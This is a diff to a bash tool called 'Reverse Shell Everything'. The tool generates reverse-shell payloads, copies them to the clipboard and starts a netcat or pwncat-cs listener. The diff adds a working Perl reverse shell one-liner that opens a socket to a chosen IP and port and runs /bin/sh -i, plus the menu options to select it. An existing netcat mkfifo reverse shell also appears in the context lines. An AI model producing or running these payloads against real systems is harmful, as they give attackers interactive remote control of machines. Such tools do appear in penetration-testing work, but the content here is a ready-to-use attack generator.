@@ -6,6 +6,7 @@ green='\033[1;32m'
 blue='\033[1;34m'
 white='\033[1;37m'
 yellow='\033[1;33m'
+
 ##Assuming pwncat is not on the system
 pwncat=0
 
@@ -46,6 +47,10 @@ function payloadmaker(){
 		echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f" | xclip -selection clipboard
 		listener "$2"
 
+	elif [ "$1" = "Perl" ]; then
+		echo "perl -e 'use Socket;\$i=$IP;\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | xclip -selection clipboard
+		listener "$2"
+
 	else
 		echo "Invalid payload.\nReport error to RST Error Forum on Github or write to us at rst@gmail.com"
 		exit 1
@@ -69,7 +74,6 @@ function listener(){
 }
 
 ##Welcome Message
-clear
 echo -e "${white}Reverse Shell Everything by Mustansir Godhrawala "
 
 ##Usage Error Message
@@ -79,7 +83,7 @@ if [ "$1" == "" ]; then
 
 ##Help Menu 
 elif [ "$1" = "help" ]; then 	
-	echo -e "${yellow}Option 1:\n1. Python\n2. Bash\n3. PHP\n4. Netcat\n"
+	echo -e "${yellow}Option 1:\n1. Python\n2. Bash\n3. PHP\n4. Netcat\n5. Perl\n"
 	echo -e "${yellow}Option 2:\n1. Netcat(Default)\n2. Pwncat-cs\n"
 	echo -e 'Usage: rs <language> <listener>'
 	echo -e 'Example: rs 1 2\n\t For a python payload and pwncat-cs listener.'
@@ -123,5 +127,13 @@ elif [ "$1" = 4 ]; then
 		payloadmaker Netcat Netcat
 	elif [ "$2" = 2 ]; then
 		payloadmaker Netcat pwncat-cs
+	fi
+
+##Netcat Caller
+elif [ "$1" = 5 ]; then
+	if [ "$2" = 1 ] || [ "$2" = "" ]; then
+		payloadmaker Perl Netcat
+	elif [ "$2" = 2 ]; then
+		payloadmaker Perl pwncat-cs
 	fi
 fi
